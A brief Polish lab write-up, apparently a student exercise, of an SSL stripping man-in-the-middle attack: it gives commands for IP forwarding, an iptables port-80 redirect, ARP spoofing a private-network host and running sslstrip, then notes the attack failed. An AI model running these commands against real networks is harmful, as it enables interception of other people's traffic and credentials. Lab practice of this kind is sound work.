# Zadanie 8 - SSLStriping

### Włączenie przekazywanie pakietów i przekierowywanie ruchu z 80/tcp na 8080/tcp
```shell
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```
### Wykonanie ataku ARP spoofing
```shell
arpspoof -i eth0 -t 192.168.179.135 192.168.179.2
```

### Uruchomienie skryptu sslstrip
```shell
sudo apt install sslstrip
ssltrip -l 8080
```

### Podczas ataku nie wyświetla się zawartość strony
Ruch na wireshirk przekazuje tylko favico
![c8e33ad250360b2312687187f374a60d.png](/_resources/c8e33ad250360b2312687187f374a60d.png)
